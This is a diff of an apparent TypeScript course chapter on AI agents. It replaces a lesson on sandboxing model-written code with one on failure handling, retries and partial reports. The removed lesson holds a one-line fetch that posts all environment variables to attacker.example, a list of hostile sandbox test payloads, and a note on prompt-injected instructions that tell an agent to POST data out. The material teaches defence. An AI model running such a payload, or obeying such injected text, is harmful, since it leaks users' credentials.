-and \\\`files\\\` (read/write within the sandbox directory only).
-NOT AVAILABLE: network, environment variables, your host filesystem, npm install.
+  switch (c.action) {
+    case "retry":
+      if (ctx.attempt >= 5) return { kind: "observe", content: \`\${label(e)} after 5 attempts. This dependency is unavailable — try a different approach.\` };
+      await sleep(fullJitter(ctx.attempt));
+      return { kind: "retry" };
 
-RETURNS: stdout plus whatever you return. Limits: 5s wall clock, 256MB, 64KB output.
-For large results, write a file and read it back in slices rather than printing it.
+    case "observe":
+      // The model's next turn sees this and adapts. No exception escapes.
+      return { kind: "observe", content: message(e, c) };
 
-PREFER THIS over several tool calls when you need to filter, aggregate or join —
-the intermediate data stays out of the conversation.\`,
-  input: obj({
-    source: str({ description: "JavaScript. Top-level await is allowed. Return a value to capture it." }),
-    why: str({ description: "one line: what this computes. shown to the user." }),
-  }),
-  readOnly: false,        // it can write inside the sandbox
-  timeoutMs: 6_000,
-  async run({ source, why }, ctx) {
-    ctx.log("sandbox.exec", { why, bytes: source.length });
-    return render(await sandbox.run(source, LIMITS, ctx.signal), LIMITS);
-  },
-});`,
-        }) +
-        p(`The <code>why</code> field costs one line and earns it twice: the user sees a readable activity log instead of a wall of code, and your traces become greppable. Requiring a stated intent also measurably reduces the "let me just try something" behaviour.`) +
-        `<h3>State between calls</h3>` +
-        p(`A sandbox that forgets everything forces the agent to re-fetch on every call. A sandbox that persists everything is a resource leak and a cross-request contamination risk. The middle: <strong>a session-scoped sandbox, destroyed when the run ends</strong>.`) +
-        code({ title: "per-run, not per-call, not global",
-          src: `export class SandboxSession {
-  private ctx = createContext();                    // survives across calls in one run
-  private dir = mkdtempSync(join(tmpdir(), "agent-"));
-
-  async run(src: string): Promise<SandboxResult> { /* … reuses this.ctx and this.dir … */ }
-
-  async dispose(): Promise<void> {
-    await rm(this.dir, { recursive: true, force: true });
-    this.ctx = null!;
+    case "stop":
+      // Layer 4: stop, but never empty.
+      return { kind: "stop", reason: c.layer === 4 ? "blocked" : "cancelled",
+               report: await partialReport(ctx.state, blockingReason(e)) };
   }
-}
-// Register dispose() on every terminal path in the loop, including the error and
-// cancellation paths. A leaked sandbox directory per failed run fills a disk in a week.`,
+}`,
         }) +
-        code({ title: "run it", lang: "bash", plain: true,
-          src: `node --experimental-strip-types code/c13_sandbox.ts
+        code({ title: "the partial report — the most important 20 lines in the chapter",
+          src: `export async function partialReport(state: RunState, why: string): Promise<string> {
+  const res = await state.model([...state.messages, userText(
+\`You must stop now: \${why}
 
-#   C13 · Code Execution — worker isolation, env stripped, no network, all limits
+Write a final report. Do not call tools.
+1. ESTABLISHED — what you determined, each with the evidence that supports it.
+2. IN PROGRESS — what you were doing when you stopped.
+3. UNKNOWN — what you did not find out, and the exact next step for each.
+4. BLOCKED BY — if something specific stopped you, name it precisely enough that
+   a human could unblock it (a permission, a missing credential, a contradictory
+   requirement).
+
+Be concrete. "I made some progress" is worthless; "I confirmed the order shipped
+on 2 March and found the tracking number, but the carrier API returns 403 — the
+API key appears to lack the tracking scope" is actionable.\`)],
+    { temperature: 0, maxTokens: 1200 });
+
+  return textOf(res.content);
+}`,
+        }) +
+        p(`That example in the prompt is doing real work: showing the model what "concrete" means produces concrete reports, and asking for it abstractly does not. The report is also the resume point for ${ch("c09", "C09")} and the handoff note for a human — one call, three uses.`) +
+        code({ title: "run it", lang: "bash", plain: true,
+          src: `node --experimental-strip-types code/c13_failure.ts
+
+#   C13 · Failure & Recovery
 #
-#   ✓ contained read process.env       returned "{}"
-#   ✓ contained exfiltrate via fetch   fetch is not a function
-#   ✓ contained read the filesystem    module 'node:fs' is not available in the sandbox
-#   ✓ contained open a socket          module 'node:net' is not available in the sandbox
-#   ✓ contained infinite loop          killed at 3001ms
-#   ✓ contained allocation bomb        Worker terminated due to reaching memory limit: JS h
-#   ✓ contained 400MB to stdout        Worker terminated due to reaching memory limit: JS h
-#   ✓ contained spawn a process        module 'node:child_process' is not available in the
+#   classification — the same try/catch, four different right answers
 #
-#   8/8 payloads contained.
-#   A worker is a fault boundary, not a security boundary — the remaining risk is a
-#   V8 escape, which is what a container or microVM buys. But note which dial did the
-#   work: env:{} and no fetch, not the isolation level.
+#     layer 1  retry    429 rate limited
+#     layer 1  retry    503 from the provider
+#     layer 4  stop     403 on a tool              authorisation will not appear by retrying
+#     layer 2  observe  400 bad request
+#     layer 2  observe  invalid tool arguments
+#     layer 1  retry    timeout, read-only tool
+#     layer 2  observe  timeout, send_email        may have taken effect — verify before retrying
+#     layer 4  stop     user cancelled
 #
-#   and the capability half — the same sandbox doing real work:
+#     403 is layer 4, never layer 1 — it is the most common wasted retry in agent code.
+#     400 is layer 2 — WE sent something wrong, which is exactly what the model can fix.
 #
-#     Returned: {
-#       "us": 255,
-#       "apac": 259,
-#       "eu": 254
-#     }
+#   circuit breaker — the value is legibility, not protection
 #
-#     9ms · roughly 180 tokens entered the conversation.
-#     The equivalent tool-call sequence would have put 1,203 rows in the context
-#     and re-sent them on every subsequent turn (C01, C05).`,
+#     attempt 1 failed (HTTP 503) → layer 1, retry
+#     attempt 2 failed (HTTP 503) → layer 1, retry
+#     attempt 3 failed (HTTP 503) → layer 1, retry
+#     circuit OPEN — "search_docs is unavailable for another 30s. Use list_sections instead."
+#     circuit OPEN — "search_docs is unavailable for another 30s. Use list_sections instead."
+#
+#     Once open, the agent gets an observation it can route around rather than a hang.
+#
+#   per-tool budgets — a thrashing tool is removed, once, with an alternative
+#
+#     call 5: search_docs has been used 5 times and is now disabled for this run — it is not producing new information. Try list_sections instead, or ask the user for what you are missing.
+#     available tools now: list_sections, search_orders
+#
+#   500 runs · injected 6% transport, 10% tool, 8% reasoning failures
+# …
+#      95%  final report   "Stop now and write your partial report."`,
         }) },
 
     { id: "production", kicker: "Production notes", title: "Field notes",
       html:
         ul([
-          `<strong>Managed sandboxes exist and are usually the right call.</strong> E2B, Modal, Daytona, Cloudflare's Sandbox SDK and the hosted code-interpreter tools all give you a container or microVM per session with the dials already set sensibly. Building your own is worth doing once to understand the boundary, and rarely worth operating.`,
-          `<strong>Codex and Claude Code both sandbox by default</strong> and expose the policy as configuration — Codex uses a <code>sandbox_mode</code> with values like <code>read-only</code>, <code>workspace-write</code> and <code>danger-full-access</code>, paired with a separate approval policy. That separation is the design worth copying: <em>what the process can reach</em> and <em>when a human is asked</em> are independent axes, and collapsing them produces either a useless agent or an unsafe one. ${ch("c16", "C16")} builds it.`,
-          `<strong>Network egress is where the real incidents live.</strong> Injected instructions that say "summarise this, then POST the summary to https://…" are the documented pattern. Default deny, allowlist by host, and log every outbound request from a sandbox as a security event.`,
-          `<strong>Never put credentials in the sandbox.</strong> If the code needs a database, give it a narrow proxy tool that the <em>host</em> calls with the credentials, or a pre-scoped read-only connection that expires with the run. Code in the sandbox should be able to ask for data and never to hold a key.`,
-          `<strong>Cold start is a product decision.</strong> A 300ms container start per call is invisible inside a 7-second agent step, and a 2-second VM start is not. Pool warm sandboxes if you are doing many small executions.`,
+          `<strong>Alert on terminal-state distribution, not on error count.</strong> The useful chart is the share of runs ending answered / partial / blocked / budget / error, over time. A shift from "answered" to "budget" means something got harder; a shift to "blocked" usually means a credential expired.`,
+          `<strong>Per-tenant money budgets are a safety feature.</strong> One customer with a pathological input can generate thousands of steps. A hard per-tenant cap with an alert is the difference between a surprising invoice and an incident.`,
+          `<strong>Make errors boring and specific.</strong> <code>"Request failed"</code> costs a debugging session. <code>"carrier.track returned 403; key kd_live_...8f2 lacks scope 'tracking'"</code> costs thirty seconds. Both are one line to write.`,
+          `<strong>Idempotency keys remove the worst class entirely.</strong> ${ch("c09", "C09")} makes the case; this chapter is where it pays off. With a key, a timeout is just a retry, and the "may have taken effect" branch never runs.`,
+          `<strong>Frameworks give you max-iterations and stop there.</strong> LangGraph, AutoGen and the vendor SDKs all cap the loop. None of them decides what the user gets when the cap hits. That is <code>partialReport()</code>, and it is yours to write.`,
         ]) },
   ],
 
   exercises: [
     { difficulty: "warm-up",
-      prompt: `Your agent uses <code>eval()</code> "just for the prototype". Write the shortest payload that demonstrates why this is unacceptable, and the smallest change that fixes the worst of it.`,
-      answer: code({ title: "one line", src: `fetch("https://attacker.example/x", { method: "POST", body: JSON.stringify(process.env) })` }) +
-        p(`Every secret the process holds — model API keys, database URLs, cloud credentials — leaves in a single expression. And the instruction to run it can arrive inside a web page the agent was asked to summarise, so no amount of user trust helps.`) +
-        p(`<strong>Smallest useful change:</strong> move to a worker with <code>env: {}</code> and no network. That is roughly fifteen lines and it contains the two payloads that cause actual incidents. It is still not a security boundary against a determined attacker — for that you need a container — but it moves you from "trivially exploitable" to "requires a V8 escape", which is a different universe.`) },
+      prompt: `Classify each to a layer and give the recovery: (a) 429; (b) 403 on a tool; (c) the model calls <code>serach_docs</code>; (d) the agent has called the same search five times; (e) the user asked to "fix the bug" with no further detail.`,
+      answer: ul([
+        `<b>(a) Layer 1.</b> Retry with full jitter, honour <code>retry-after</code>. Invisible to the model.`,
+        `<b>(b) Layer 4.</b> Stop. A permission does not appear by retrying. Report which credential lacks which scope — that is the sentence that gets it fixed.`,
+        `<b>(c) Layer 2.</b> Observation naming the real tools and the nearest match. Recovered next turn.`,
+        `<b>(d) Layer 3.</b> Not visible as an error at all — it must be detected by the repeat detector and injected as an observation.`,
+        `<b>(e) Layer 4.</b> Stop and ask, immediately. Guessing which bug costs ten steps and produces a change nobody wanted.`,
+      ]) + p(`Note that (b) and (e) are both "stop", and both should happen within the first two steps. Failing fast is a feature when the failure is definitional.`) },
 
     { difficulty: "core",
-      prompt: `Design the interface by which sandboxed code accesses a database, given that credentials must not enter the sandbox.`,
-      answer: code({ title: "a host-side proxy with a narrow contract",
-        src: `// INSIDE the sandbox: a stub that posts to the host over the worker message channel.
-// It holds no credentials and cannot reach the network.
-const db = {
-  query: (sql: string, params?: unknown[]) => hostCall("db.query", { sql, params }),
-};
-
-// ON THE HOST: the only place the connection exists.
-async function handleDbQuery({ sql, params }: DbRequest, ctx: RunCtx): Promise<Rows> {
-  if (!isReadOnly(sql)) throw new PolicyError("only SELECT is permitted from the sandbox");
-  if (!withinTenantScope(sql, ctx.tenantId)) throw new PolicyError("cross-tenant query refused");
-
-  ctx.log("sandbox.db", { sql: redact(sql), tenant: ctx.tenantId });
-  const rows = await pool.query({ text: sql, values: params, timeout: 5_000 }, ctx.tenantRole);
-  if (rows.length > 50_000) throw new PolicyError(\`\${rows.length} rows exceeds the limit\`);
-  return rows;
-}` }) +
-      ul([
-        `<strong>The credential never crosses the boundary.</strong> The sandbox has a function; the host has the connection.`,
-        `<strong>Policy is enforced on the host</strong>, where it can be tested and audited — read-only, tenant-scoped, row-limited, timed out. A prompt instruction saying "only run SELECTs" is not enforcement.`,
-        `<strong>Use the database's own authorisation too.</strong> Connect as a role that physically cannot write and cannot see other tenants. Defence in depth: your SQL parser will eventually be wrong.`,
-        `<strong>Log every query with the tenant.</strong> This is the audit trail for a data-access incident, and it is the only record that the sandbox touched real data.`,
-      ]) +
-      p(`The same shape works for every capability the sandbox needs: HTTP fetches through a host proxy with an allowlist, file access scoped to one directory, secrets never at all.`) },
-
-    { difficulty: "core",
-      prompt: `An agent runs <code>console.log</code> in a loop over 200,000 rows. The sandbox kills it at 5 seconds. What has already gone wrong, and how do you prevent it?`,
-      answer: p(`By 5 seconds it has produced perhaps 400 MB of stdout. Three things break, in order:`) +
-        ol([
-          `<strong>Memory.</strong> If you buffer stdout in a string, your <em>host</em> process now holds 400 MB. The sandbox's memory limit did not help, because the memory is on your side of the boundary.`,
-          `<strong>Context.</strong> If any of it reaches the model, you have blown the window and the run dies (${ch("c05", "C05")}).`,
-          `<strong>Cost.</strong> Whatever fraction does reach the model is billed on every subsequent turn.`,
-        ]) +
-        code({ title: "cap at the read, and tell the model what to do instead",
-          src: `let out = "", dropped = 0;
-worker.stdout.on("data", (chunk: Buffer) => {
-  if (out.length < LIMITS.outputBytes) out += chunk.toString().slice(0, LIMITS.outputBytes - out.length);
-  else dropped += chunk.length;                 // count, do not accumulate
+      prompt: `An agent calls a flaky API that fails 20% of the time transiently. Design the full policy: retries, circuit breaker, and what the agent is told.`,
+      answer: code({ title: "layered, and legible to the model",
+        src: `const flaky = defineTool({
+  name: "get_inventory", idempotent: true, timeoutMs: 8_000,
+  description: \`Live inventory for a SKU. This service is intermittently unavailable;
+if it fails twice, proceed with the last known figures from get_catalog and say so
+in your answer rather than retrying further.\`,          // ← policy the MODEL can follow
+  async run({ sku }, ctx) {
+    return breaker.call(() => retry(() => api.inventory(sku), {
+      attempts: 3, baseMs: 200, capMs: 2_000,            // fast retries: transient blips
+      retryOn: (e) => e.status >= 500 || e.status === 429,
+    }));
+  },
 });
 
-// And the message that makes it recoverable rather than just capped:
-if (dropped) out += \`\\n\\n[\${fmt(dropped)} of further output discarded. Printing per-row does \` +
-  \`not work here — aggregate before printing, or write to a file and read it in slices \` +
-  \`with read_lines(path, start, end).]\`;`,
-        }) +
-        p(`Capping at the read rather than trusting a write-side limit is the general principle: the boundary you control is the one that counts. And the remedy in the message matters as much as the cap. An agent told only "output truncated" will retry the same loop.`) },
+// Breaker: 5 failures in a row → open for 30s. While open the tool returns an
+// observation, not an exception:
+//   "get_inventory is unavailable (circuit open, retry in 24s). Use get_catalog
+//    for last-known stock levels, and note the staleness in your answer."` }) +
+      ul([
+        `<strong>Three layers, each doing its own job.</strong> Retries absorb single blips (sub-second, invisible). The breaker absorbs a sustained outage (stops the storm, fails fast). The description tells the model what to do when both give up — which is the layer everyone forgets.`,
+        `<strong>Fast retries, not exponential-to-30s.</strong> Inside an agent step, a retry ladder that takes 30 seconds has already blown the user's patience. Cap the total retry window at roughly one second for interactive tools and let the breaker handle anything longer.`,
+        `<strong>Idempotent matters here.</strong> A read is trivially safe to retry. The same policy on a non-idempotent write would need the timeout branch from ${ch("c09", "C09")}.`,
+        `<strong>Name the fallback in the description.</strong> "Use get_catalog and say so" turns a dependency outage into a degraded-but-correct answer instead of a failed run.`,
+      ]) },
+
+    { difficulty: "core",
+      prompt: `Implement the per-tool call budget: after N calls to one tool, remove it and tell the model. What are the failure modes of doing this naively?`,
+      answer: code({ title: "disable with an explanation and an alternative",
+        src: `export class ToolBudget {
+  private counts = new Map<string, number>();
+  constructor(private limits: Record<string, number>, private fallbacks: Record<string, string>) {}
+
+  record(name: string): void { this.counts.set(name, (this.counts.get(name) ?? 0) + 1); }
+
+  available(all: Tool[]): Tool[] {
+    return all.filter((t) => (this.counts.get(t.name) ?? 0) < (this.limits[t.name] ?? Infinity));
+  }
+
+  justDisabled(name: string): string | null {
+    const n = this.counts.get(name) ?? 0;
+    if (n !== (this.limits[name] ?? Infinity)) return null;     // fire exactly once
+    return \`\${name} has been used \${n} times and is now disabled for this run. \` +
+           \`It is not producing new information. \` +
+           (this.fallbacks[name] ? \`Try \${this.fallbacks[name]} instead, or \` : "") +
+           \`ask the user for what you are missing.\`;
+  }
+}` }) +
+      p(`<strong>Failure modes of the naive version:</strong>`) +
+      ul([
+        `<strong>Silent removal.</strong> The tool vanishes from the schema and the model keeps requesting it, getting "unknown tool" errors and no idea why. Always announce it, once, with the reason.`,
+        `<strong>No alternative offered.</strong> Disabling the only search tool without naming a fallback leaves the agent with nothing to do but give up. Every budgeted tool needs a named next-best option or an explicit "ask the user".`,
+        `<strong>Counting legitimate use.</strong> A file-reading agent may legitimately call <code>read_file</code> forty times. Budget the tools that <em>thrash</em> — search, list, retry-prone lookups — not the ones that do bulk work. Better still, budget on <em>distinct arguments</em>: twenty reads of twenty files is fine, twenty reads of the same file is not.`,
+        `<strong>Firing repeatedly.</strong> Announcing the disablement every turn wastes tokens and reads as nagging. Fire exactly on the transition.`,
+      ]) },
 
     { difficulty: "stretch",
-      prompt: `Decide whether your agent needs a microVM or whether a container is enough. Write the decision as something you could defend in a security review.`,
-      answer: p(`The question reduces to: <strong>can the code executed in the sandbox be influenced by content from outside your trust boundary?</strong>`) +
-        ol([
-          `<strong>Trace every path into the code.</strong> The model writes the code, so anything in the model's context can influence it: the user's prompt, retrieved documents, web pages, tool results, uploaded files, and memory written during earlier runs (${ch("c07", "C07")}). List them.`,
-          `<strong>Classify each path.</strong> A first-party document store curated by your team is one thing; an arbitrary URL the agent fetched is another. If <em>any</em> path is untrusted, the code must be treated as attacker-controlled — not "influenced by", but written by an adversary.`,
-          `<strong>Then the trade is explicit.</strong> A container's boundary is the kernel: a kernel or runtime escape reaches the host and its neighbours. A microVM's boundary is hardware virtualisation, which is a much narrower and better-studied surface. Against attacker-controlled code with real value on the host, that difference is worth roughly 100ms and a more complex deployment.`,
-          `<strong>Also weigh the blast radius.</strong> A single-tenant sandbox on a dedicated node that holds nothing sensitive is a different risk from a shared multi-tenant pool next to other customers' data. Multi-tenant plus untrusted code is the combination that makes microVMs non-negotiable.`,
+      prompt: `Design the alerting for a production agent: what to alert on, what to dashboard, and what to ignore. Include at least one leading indicator.`,
+      answer: p(`<strong>Page someone (wake a human):</strong>`) +
+        ul([
+          `Per-tenant spend over its cap — this is a runaway loop and it compounds.`,
+          `Terminal state "blocked" above baseline — a credential expired or a permission changed, and every affected run is failing identically.`,
+          `Any tool's error rate above 50% for five minutes — a dependency is down and the breaker is holding, but the agent is degraded.`,
+          `"Failed empty" above 2% — users are getting nothing back.`,
         ]) +
-        p(`<strong>The defensible version:</strong> "Our agent fetches arbitrary web pages, so sandboxed code is attacker-controlled. Sandboxes run multi-tenant. We therefore use microVMs with no egress, stripped environment, a per-run ephemeral disk, and outbound requests only through a host proxy with a per-tenant allowlist. Escape would require a hypervisor vulnerability, and would reach a node holding no credentials and no other tenant's data."`) +
-        p(`And the honest counterpart: if the agent only ever runs code over data your team supplied, on a single-tenant node, a container with the three dials set correctly is a reasonable place to be, provided you re-run this analysis the day someone adds a web-fetch tool.`) },
+        p(`<strong>Dashboard (look at it daily):</strong> terminal-state distribution over time; steps-to-completion histogram split by outcome; cost per successful run; tool error rates and p99 latencies; router fallback rate (${ch("c12", "C12")}).`) +
+        p(`<strong>Leading indicators — the point of the exercise:</strong>`) +
+        ul([
+          `<strong>The p95 of steps-to-completion, for runs that succeeded.</strong> This rises <em>before</em> the success rate falls. An agent taking 9 steps for what used to take 5 is already going wrong; it is still succeeding, so nothing alerts, and next week it will not be.`,
+          `<strong>Repeat-detector fire rate.</strong> An increase means the agent is thrashing more often, usually because a tool started returning less useful results or a prompt change removed a hint.`,
+          `<strong>Degradation-ladder rung reached.</strong> Runs hitting "drop tools" that never used to is a context or budget regression.`,
+        ]) +
+        p(`<strong>Ignore:</strong> individual 429s and 5xx (that is what retries are for; alert on the <em>rate of retry exhaustion</em> instead), individual tool errors (layer 2 is a normal, recoverable part of operation), and raw model latency (you care about end-to-end, and a slow model call inside a 9-step run is noise).`) },
   ],
 
   qa: [
-    { q: "Python or JavaScript for the sandbox?", a: p(`Python if the work is data analysis. Pandas and numpy are what the model has seen most, and it writes better Python for that domain. JavaScript if you are already a Node shop and want worker threads without a second runtime. The isolation question is identical either way; only the ecosystem differs.`) },
-    { q: "Should I let the agent install packages?", a: p(`Only from an allowlisted registry, into an ephemeral sandbox, with a timeout. Note that installation is arbitrary code execution by another name: a postinstall script runs with whatever the sandbox has. Pre-baking a curated image with the twenty libraries your domain needs is faster and safer than an open install path.`) },
-    { q: "How do I show the user what the code did?", a: p(`Show the <code>why</code> line and the result by default, with the source behind a disclosure. Users want to know what happened, not to read JavaScript. But the ones who do want to read it are exactly the ones who will catch a mistake, so make it one click away rather than hidden.`) },
-    { q: "Can the agent use code execution to edit its own files?", a: p(`It can and it should not: a general interpreter is an unauditable way to make file edits. Use a dedicated, structured edit tool instead, which can be reviewed, diffed and approved. ${ch("c14", "C14")} is exactly this argument.`) },
-    { q: "What about running the sandbox in the browser with WASM?", a: p(`Genuinely good for client-side agents: the browser's sandbox is mature, there is no server to compromise, and the user's own data stays local. The limits are performance, the ~50MB of runtime to download, and the fact that the code cannot reach your backend — which, for a computation sandbox, is a feature.`) },
+    { q: "How many retries?", a: p(`Three to five for transport, with full jitter and a total window matched to the caller's patience — about one second inside an interactive tool, longer for background work. Zero for everything else: layer 2 goes back to the model, layer 4 stops. If you find yourself wanting six, you want a circuit breaker.`) },
+    { q: "Should the agent retry its own reasoning?", a: p(`Re-running the same model call on the same context mostly reproduces the same output, so a bare retry is close to useless. What works is changing something: inject the observation that describes what went wrong (the repeat detector's message), or fork before the bad turn (${ch("c09", "C09")}) and re-run at a higher temperature. Both change the input; a retry does not.`) },
+    { q: "What if a partial report is embarrassing?", a: p(`It is more embarrassing to have done nine steps of work and returned nothing. A report that says "I confirmed A and B, I could not do C because the API key lacks the tracking scope" is a good product experience and an actionable bug report. The version to avoid is a partial report that <em>sounds</em> complete, hence the explicit UNKNOWN and BLOCKED BY sections.`) },
+    { q: "Do I need circuit breakers if I have retries?", a: p(`Yes, for a different job. Retries handle a blip; a breaker handles an outage. It stops fifty concurrent agents from retrying into a dead service, and it converts the failure into a fast, informative observation the agent can route around. Without it, a downed dependency turns every run into a slow failure.`) },
+    { q: "How do I test failure handling without breaking production?", a: p(`A failure-injecting mock model and tool registry: configurable rates per layer, deterministic under a seed, in your test suite. That is what generated this chapter's numbers. Add the specific failures you have actually seen in production as named scenarios — an expired token, a 200 with an empty body, a tool that returns HTML instead of JSON — and they become regression tests.`) },
   ],
 
   project: {
-    title: "Project · A sandbox you have tried to break",
-    brief: p(`Add code execution to your agent, then write the payload suite that attacks it. The deliverable is the suite and its results. A sandbox nobody has attacked is a sandbox with unknown properties.`),
+    title: "Project · Make your agent hard to kill",
+    brief: p(`Add the four-layer recovery policy to your agent, then prove it with injected failures. The headline number is "failed empty" — get it under 1%.`),
     spec: [
-      "A <code>run_code</code> tool over worker threads with <code>env: {}</code>, no network, and a stubbed module loader.",
-      "All six limits: wall clock, CPU, memory, output bytes, file bytes, process count.",
-      "Output capped at the read, head-and-tail, with a remedy naming the alternative.",
-      "A session-scoped sandbox reused across calls in one run and disposed on every terminal path, including errors and cancellation.",
-      "Errors rendered with stdout-before-the-error, not just the stack trace.",
-      "A payload suite of at least eight hostile programs with pass/fail results, run as a test.",
-      "A capability demonstration: one task solved with code in one call versus the equivalent tool sequence, with the token counts for both.",
+      "<code>classify(error, ctx)</code> mapping every error to a layer and an action, with 401/403 as layer 4 and 400 as layer 2.",
+      "Retries with full jitter for layer 1 only, and a circuit breaker per dependency whose open state returns an observation naming the retry time.",
+      "Layer 2 failures returned as tool results; nothing escapes the tool boundary as an exception.",
+      "Per-tool call budgets that disable a thrashing tool once, with a reason and a named alternative.",
+      "A degradation ladder with at least three rungs, each announced to the model.",
+      "<code>partialReport()</code> with ESTABLISHED / IN PROGRESS / UNKNOWN / BLOCKED BY, called on every non-success terminal state.",
+      "A failure-injection harness reporting completed / partial / empty / spend across at least four policies.",
     ],
     stretch: [
-      "Add a host-side database proxy with read-only and tenant-scope enforcement, and a test proving a write is refused.",
-      "Add an egress allowlist through a host proxy and log every outbound request.",
-      "Swap the worker for a container behind the same interface and compare cold start, then write the paragraph you would give a security reviewer about which one you chose and why.",
+      "Add per-tenant money budgets with an alert, and prove a pathological input stops rather than compounding.",
+      "Make the partial report resumable: feed it back as the starting context for a new run and measure how many steps are saved versus starting over.",
+      "Add your real production failures as named scenarios in the harness.",
     ],
   },
 
   quiz: [
-    { q: "What is the strongest argument for code execution over many specific tools?",
-      options: ["Composition plus context economy — 50,000 rows can be processed while only the answer enters the context", "Models write code more accurately than they call tools", "It reduces the number of model calls to one", "It removes the need for a schema"],
+    { q: "Which failure layer is the only one where retrying is the right response?",
+      options: ["Transport — 429s, 5xx, resets, timeouts on idempotent operations", "Tool errors like bad arguments", "Reasoning failures like loops", "Task failures like missing permissions"],
       answer: 0,
-      why: "A program composes loops and conditionals in one action, and crucially the intermediate data never enters the message array — where it would otherwise be re-sent and re-billed on every subsequent turn." },
-    { q: "Which single sandbox setting removes the most harm?",
-      options: ["Network egress off by default", "A shorter wall-clock timeout", "A smaller memory limit", "Running as a non-root user"],
+      why: "Retrying a malformed tool call reproduces it, retrying a loop reproduces the loop more expensively, and retrying a 403 never succeeds. Only transient transport faults are fixed by trying again." },
+    { q: "A tool returns 403. What layer is it and what should happen?",
+      options: ["Layer 4 — stop and report which credential lacks which permission", "Layer 1 — retry with backoff", "Layer 2 — feed back and let the model try different arguments", "Layer 3 — inject an observation about looping"],
       answer: 0,
-      why: "Exfiltrating credentials, calling an attacker's endpoint and pulling a second stage all need a route out. With egress denied, malicious code is largely confined to a container you are about to destroy." },
-    { q: "Why is a Node worker thread not a security boundary?",
-      options: ["It shares the process, so module access must be manually removed and a runtime escape compromises everything", "Workers cannot enforce memory limits", "Workers inherit stdin", "Workers cannot be terminated"],
+      why: "A permission does not appear by retrying, and no rephrasing of arguments creates authorisation. Stopping in step two with a precise, fixable message beats failing in step nine after a retry storm." },
+    { q: "Why must an agent never fail empty?",
+      options: ["It typically completed real work before failing, and discarding it destroys value and trust", "Empty failures are harder to log", "The API charges for failed runs", "Users cannot distinguish empty failures from timeouts"],
       answer: 0,
-      why: "It is a fault boundary with useful resource limits. Use it for code influenced only by content inside your trust boundary; use a container or microVM once web pages, uploads or third-party documents can reach the model's context." },
-    { q: "A sandboxed program prints 400MB to stdout before being killed at 5 seconds. What failed?",
-      options: ["Output was not capped at the read, so the host process buffered it all", "The wall-clock timeout was too generous", "The memory limit applied only to the heap", "stdout was not redirected"],
+      why: "Nine successful steps followed by 'I was unable to complete this request' is both a bad product and a waste of money already spent. One extra model call turns it into a report that is useful and resumable." },
+    { q: "What does a circuit breaker give an agent that retries alone do not?",
+      options: ["A fast, informative observation — 'this tool is down for 24 more seconds' — that the agent can route around", "Lower token usage", "Automatic failover to another provider", "Protection against malformed arguments"],
       answer: 0,
-      why: "The sandbox's memory limit does not govern your side of the pipe. Cap at the read, count what you drop, and tell the model to aggregate or write to a file instead. Otherwise it retries the same loop." },
-    { q: "How should sandboxed code access a database?",
-      options: ["Through a host-side proxy that holds the credentials and enforces read-only and tenant scope", "With a read-only connection string passed into the sandbox", "By having the model include credentials in the code it writes", "Through an environment variable the sandbox can read"],
+      why: "The breaker's value inside an agent is legibility. A hanging retry storm gives the model nothing; 'unavailable, try get_catalog instead' makes it choose a different approach immediately." },
+    { q: "Why announce budget degradation to the model rather than silently shrinking resources?",
+      options: ["Models consolidate and prioritise when told there is a deadline, and do neither when it is invisible", "It satisfies logging requirements", "It prevents the model from calling disabled tools", "It reduces token usage"],
       answer: 0,
-      why: "Credentials must never cross the boundary. The sandbox gets a function; the host holds the connection and enforces policy where it can be tested and audited — with the database's own role permissions as a second layer." },
-    { q: "What determines whether you need a microVM rather than a container?",
-      options: ["Whether the executed code can be influenced by content from outside your trust boundary, and whether sandboxes are multi-tenant", "The volume of code executions per day", "The programming language used", "Whether the code needs network access"],
+      why: "An agent that knows it is at 85% of budget starts wrapping up. One that is silently degraded keeps planning as if it had room, and then gets cut off mid-thought." },
+    { q: "What is the best leading indicator that an agent is degrading in production?",
+      options: ["Rising p95 steps-to-completion among runs that still succeed", "Total error count", "Average model latency", "Number of tools registered"],
       answer: 0,
-      why: "The model writes the code, so anything in its context can shape it, including fetched web pages. If any input path is untrusted, treat the code as attacker-written; combine that with multi-tenant hosts and hardware isolation stops being optional." },
+      why: "It moves before the success rate does. An agent taking nine steps for what used to take five is already going wrong while every dashboard still looks green, which is exactly when you want to know." },
   ],
 
-  continues: p(`A sandbox gives the agent a place to compute. A coding agent needs something harder: the ability to change files that matter, on your machine, in a way you can review. That means a file-edit format a model can actually produce reliably, and the design of that format turns out to be one of the most interesting engineering decisions in the whole field. ${ch("c14", "C14")} works through it.`),
+  continues: p(`The agent is now reliable within the world you gave it: a few tools, some documents, a model. That world is small. The next four chapters widen it — code execution, the filesystem and shell, a protocol for other people's tools, and the human who has to approve the parts that can do damage. ${ch("c14", "C14")} starts with the tool that subsumes all the others.`),
 };
 
 export default chapter;
